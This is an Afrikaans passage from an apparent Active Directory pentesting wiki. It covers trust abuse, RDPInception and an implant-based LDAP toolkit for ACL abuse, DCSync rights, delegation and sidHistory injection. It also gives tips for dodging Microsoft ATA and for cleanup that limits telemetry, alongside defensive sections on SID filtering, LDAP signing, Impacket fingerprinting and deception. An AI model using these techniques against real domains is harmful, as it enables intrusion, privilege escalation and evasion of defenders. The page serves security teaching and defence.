Wanneer ’n **domein deur die vertrouende domein vertrou word**, **skep die vertroude domein ’n gebruiker** met ’n **voorspelbare naam** en gebruik dit **die vertroude wagwoord as wagwoord**. Dit beteken dat dit moontlik is om **toegang tot ’n gebruiker in die vertrouende domein te verkry en van daar af die vertroude domein binne te gaan** om dit te inventariseer en verdere voorregte te probeer eskaleer:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Nog ’n manier om die vertroude domein te kompromitteer, is om ’n [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) te vind wat in die **teenoorgestelde rigting** van die domeinvertroue geskep is (wat nie baie algemeen is nie).

Nog ’n manier om die vertroude domein te kompromitteer, is om te wag by ’n masjien waar ’n **gebruiker van die vertroude domein kan aanmeld** via **RDP**. Die aanvaller kan dan kode in die RDP-sessieproses inspuit en van daar af **toegang tot die oorsprongdomein van die slagoffer verkry**.\
Verder, as die **slagoffer sy hardeskyf gemonteer het**, kan die aanvaller vanuit die **RDP-sessieproses** **backdoors** in die **opstartvouer van die hardeskyf** stoor. Hierdie tegniek word **RDPInception** genoem.


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigering van domeinvertrouemisbruik

### **SID Filtering:**

- Die risiko van aanvalle wat die SID history-kenmerk oor forest trusts benut, word deur SID Filtering versag. Dit is by verstek op alle inter-forest trusts geaktiveer. Dit berus op die aanname dat intra-forest trusts veilig is, aangesien Microsoft die forest, eerder as die domein, as die sekuriteitsgrens beskou.
- Daar is egter ’n voorbehoud: SID filtering kan toepassings en gebruikertoegang ontwrig, wat daartoe lei dat dit soms gedeaktiveer word.

### **Selective Authentication:**

- Vir inter-forest trusts verseker Selective Authentication dat gebruikers van die twee forests nie outomaties geverifieer word nie. In plaas daarvan word uitdruklike toestemmings vereis sodat gebruikers toegang tot domeine en bedieners binne die vertrouende domein of forest kan verkry.
- Dit is belangrik om daarop te let dat hierdie maatreëls nie beskerming bied teen die uitbuiting van die skryfbare Configuration Naming Context (NC) of aanvalle op die trust account nie.

[**Meer inligting oor domeintrusts by ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## LDAP-gebaseerde AD-misbruik vanaf on-host implants

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) herimplementeer bloodyAD-styl LDAP-primitives as x64 Beacon Object Files wat geheel en al binne ’n on-host implant (bv. Adaptix C2) loop. Operators stel die pack saam met `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laai `ldap.axs`, en roep dan `ldap <subcommand>` vanaf die beacon aan. Alle verkeer gebruik die huidige aanmeldsekuriteitskonteks oor LDAP (389) met signing/sealing of LDAPS (636) met outomatiese sertifikaattrust, dus is geen socks-proxies of skyfartefakte nodig nie.<sup>[[4]](#references)</sup>

### LDAP-enumerasie aan die implant-kant

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` en `get-groupmembers` los kort name/OU-paaie na volledige DNs op en dump die ooreenstemmende objects.
- `get-object`, `get-attribute` en `get-domaininfo` haal arbitrêre attributes (insluitend security descriptors) plus die forest-/domeinmetadata uit `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` en `get-rbcd` wys roasting-kandidate, delegation-instellings en bestaande [Resource-based Constrained Delegation](resource-based-constrained-delegation.md)-descriptors direk vanuit LDAP.
- `get-acl` en `get-writable --detailed` ontleed die DACL om trustees, regte (GenericAll/WriteDACL/WriteOwner/attribute writes) en inheritance te lys, wat onmiddellike teikens vir ACL-voorregte-eskalasie oplewer.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### LDAP-skryfprimitiewe vir privilege escalation en persistence

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) laat die operator toe om nuwe principals of masjienrekeninge te skep waar OU-regte bestaan. `add-groupmember`, `set-password`, `add-attribute` en `set-attribute` kap teikens direk oor sodra write-property-regte gevind is.
- ACL-gerigte opdragte soos `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` en `add-dcsync` skakel WriteDACL/WriteOwner op enige AD-object om in password resets, beheer oor groep-lidmaatskap of DCSync-replikasievoorregte, sonder om PowerShell/ADSI-artefakte agter te laat. Die `remove-*`-ekwivalente maak ingevoegde ACEs skoon.

### Delegation, roasting en Kerberos-misbruik

- `add-spn`/`set-spn` maak ’n gekompromitteerde gebruiker onmiddellik Kerberoastable; `add-asreproastable` (UAC-wissel) merk dit vir AS-REP roasting sonder om aan die password te raak.
- Delegation-makro’s (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) herskryf `msDS-AllowedToDelegateTo`, UAC-vlae of `msDS-AllowedToActOnBehalfOfOtherIdentity` vanaf die beacon, wat constrained/unconstrained/RBCD-aanvalspaaie moontlik maak en die behoefte aan remote PowerShell of RSAT uitskakel.

### sidHistory-inspuiting, OU-verskuiwing en vorming van die aanvaloppervlak

- `add-sidhistory` spuit bevoorregte SIDs in die SID-geskiedenis van ’n beheerde principal in (sien [SID-History Injection](sid-history-injection.md)), wat sluipende toegangerfenis bied, volledig oor LDAP/LDAPS.
- `move-object` verander die DN/OU van rekenaars of gebruikers, sodat ’n aanvaller bates onder gedelegeerde regte kan bring voordat `set-password`, `add-groupmember` of `add-spn` gebruik word. Sien [OU relocation and inherited rights](acl-persistence-abuse/#moving-an-object-into-inherited-ou-permissions) vir move-regte en erfkontroles.
- Noukeurig afgebakende verwyderingsopdragte (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, ens.) maak vinnige terugrol moontlik nadat die operator credentials of persistence ingesamel het, wat telemetrie tot die minimum beperk.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Enkele algemene verdedigingsmaatreëls

[**Kom hier meer te wete oor hoe om credentials te beskerm.**](../stealing-credentials/credentials-protections.md)

### **Verdedigingsmaatreëls vir credential-beskerming**

- **Beperkings vir Domain Admins**: Dit word aanbeveel dat Domain Admins slegs by Domain Controllers mag aanmeld, en nie op ander hosts gebruik word nie.
- **Voorregte vir diensrekeninge**: Dienste behoort nie met Domain Admin (DA)-voorregte te loop nie, om sekuriteit te handhaaf.
- **Tydelike beperking van voorregte**: Vir take wat DA-voorregte vereis, moet die tydsduur beperk word. Dit kan soos volg gedoen word: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **Versagting van LDAP relay**: Oudit Event IDs 2889/3074/3075 en dwing daarna LDAP signing plus LDAPS channel binding op DCs/clients af om LDAP MITM/relay-pogings te blokkeer.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### Protokolvlak-fingerprinting van Impacket-aktiwiteit

As jy algemene AD-tradecraft wil opspoor, **moenie net op artefakte staatmaak wat deur die operator beheer word nie**, soos hernoemde binaries, diensname, tydelike batch-lêers of uitvoerpaaie. Stel ’n basislyn op van hoe wettige Windows-clients [Kerberos](kerberos-authentication.md)-, [NTLM](../ntlm/README.md)-, SMB-, LDAP-, DCE/RPC- en WMI-verkeer genereer, en soek dan na **implementeringskenmerke** wat voortbestaan selfs nadat die operator `psexec.py`, `wmiexec.py`, `dcomexec.py`, `atexec.py` of `ntlmrelayx.py` gewysig het.<sup>[[8]](#references)</sup>

- **Kandidate met hoë vertroue as alleenstaande aanwysers** (nadat dit teen jou eie basislyn bevestig is):
  - Geïdentifiseerde DCE/RPC met `auth_context_id = 79231 + ctx_id`
  - DCE/RPC-verifikasievulling met `0xff`
  - LDAP Kerberos-binds wat ’n rou Kerberos `AP-REQ` direk in SPNEGO `mechToken` plaas
  - SMB2/3-negotiate-versoeke met ASCII-agtige `ClientGuid`-waardes
  - WMI `IWbemLevel1Login::NTLMLogin` met die nie-standaardnaamruimte `//./root/cimv2`
  - Hardgekodeerde Kerberos nonce-waardes
- **Beter geskik as korrelasie-/tellingseienskappe**:
  - Dun of gedupliseerde Kerberos-etype-lyste, ongewone/ontbrekende `PA-DATA`, of TGS-REQ-etype-volgordes wat van native Windows verskil
  - NTLM Type 1-boodskappe sonder weergawe-inligting of Type 3-boodskappe met null-gasheername
  - Rou NTLMSSP wat in DCE/RPC gedra word in plaas van SPNEGO, ontbrekende DCE/RPC-verifikasie-aanhangsels, of SPNEGO/Kerberos-OID-wanpassings
  - Verskeie van hierdie eienskappe vanaf dieselfde host/user/session/tydvenster is baie sterker as enige enkele swak veld
- **Gebruik as verryking, nie as alleenstaande waarskuwings nie**:
  - Versteklêername, uitvoerpaaie, ewekansige diensname, tydelike batch-name, verstekrekenaarrekeningname en tool-spesifieke HTTP/WebDAV/RDP/MSSQL-stringe
  - Operators kan dit maklik verander; dit word die beste gebruik om te verduidelik waarom ’n kru protokol-kluster verdag is
- **Operasionele notas**:
  - Sommige van hierdie seine vereis gedekripteerde verkeer, [PCAP/Zeek-ontleding](../../generic-methodologies-and-resources/basic-forensic-methodology/pcap-inspection/README.md), ETW of sigbaarheid aan die dienskant
  - Bevestig dit teen Samba/Linux-clients, toestelle en ouer sagteware voordat jy dit as waarskuwings aktiveer
  - Skuif opsporings van verryking -> ondersoek -> waarskuwings namate jy meer vertroue in die basislyn opbou

### **Implementering van deception-tegnieke**

- Deception behels die stel van lokvalle, soos lokgebruikers of -rekenaars, met eienskappe soos passwords wat nie verval nie of wat as Trusted for Delegation gemerk is. ’n Gedetailleerde benadering sluit in om gebruikers met spesifieke regte te skep of hulle by groepe met hoë voorregte te voeg.<sup>[[2]](#references)</sup>
- ’n Praktiese voorbeeld is die gebruik van tools soos: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Meer oor die ontplooiing van deception-tegnieke is beskikbaar by [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifisering van deception**

- **Vir User Objects**: Verdagte aanwysers sluit in atipiese ObjectSID, ongereelde aanmeldings, skeppingsdatums en lae tellings vir verkeerde passwords.
- **Algemene aanwysers**: Deur die eienskappe van moontlike lokobjekte met dié van egte objekte te vergelyk, kan teenstrydighede aan die lig kom. Tools soos [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) kan help om sulke deception te identifiseer.

### **Omseiling van opsporingstelsels**

- **Omseiling van Microsoft ATA-opsporing**:
  - **User Enumeration**: Vermy die enumerasie van sessies op Domain Controllers om ATA-opsporing te voorkom.
  - **Ticket Impersonation**: Die gebruik van **aes**-sleutels om tickets te skep, help om opsporing te ontduik deur nie na NTLM af te gradeer nie.
  - **DCSync-aanvalle**: Dit word aanbeveel om dit vanaf ’n nie-Domain Controller uit te voer om ATA-opsporing te vermy, aangesien direkte uitvoering vanaf ’n Domain Controller waarskuwings sal aktiveer.

## References

- [1] [’n Gids vir die aanval op Domain Trusts](https://blog.harmj0y.net/redteaming/a-guide-to-attacking-domain-trusts/)
- [2] [Vertroue vervals vir deception in Active Directory](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [3] [Van Domain Admin tot Enterprise Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [4] [LDAP BOF Collection – ’n LDAP-toolkit in geheue vir Active Directory-exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [5] [TrustedSec – Holy Shuck! Gebruik NTLM-hashes as ’n wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [6] [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [7] [Hashcat](https://github.com/hashcat/hashcat)
- [8] [ThatTotallyRealMyth/Impacket-IoCs – Impacket ontleed](https://github.com/ThatTotallyRealMyth/Impacket-IoCs)
- [9] [rub-softsec/onelogon - Onelogon: Neem Active Directory-rekeninge oor via Netlogon](https://github.com/rub-softsec/onelogon)
- [10] [Microsoft - Hoe om die veranderinge in Netlogon-veilige-kanaalverbindings wat met CVE-2020-1472 verband hou, te bestuur](https://support.microsoft.com/en-us/topic/how-to-manage-the-changes-in-netlogon-secure-channel-connections-associated-with-cve-2020-1472-f7e8cc17-0309-1d6a-304e-5ba73cd1a11e)
- [11] [’n Reis deur vergete Null Session- en MS-RPC-koppelvlakke](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
- [12] [SID-filter as sekuriteitsgrens tussen domeine? (Deel 4) - Navorsing oor die omseiling van SID-filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4)
- [13] [SID-filter as sekuriteitsgrens tussen domeine? (Deel 5) - Golden GMSA trust-aanval - van child na parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5)
- [14] [SID-filter as sekuriteitsgrens tussen domeine? (Deel 6) - Schema change trust-aanval - van child na parent](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6)
- [15] [Van DA na EA met ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/)
- [16] [Van child domain-admins tot enterprise-admins in 5 minute deur AD CS te misbruik: ’n opvolg](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/)
- [17] [’n ACE agter die hand: Ontwerp van Active Directory DACL-agterdeure](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)
- [18] [Bronkode vir NetExec pre2k-module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/pre2k.py)
- [19] [Microsoft ADSchema - msDS-GroupMSAMembership-attribute](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [20] [0xdf - HTB Pirate](https://0xdf.gitlab.io/2026/09/05/htb-pirate.html)
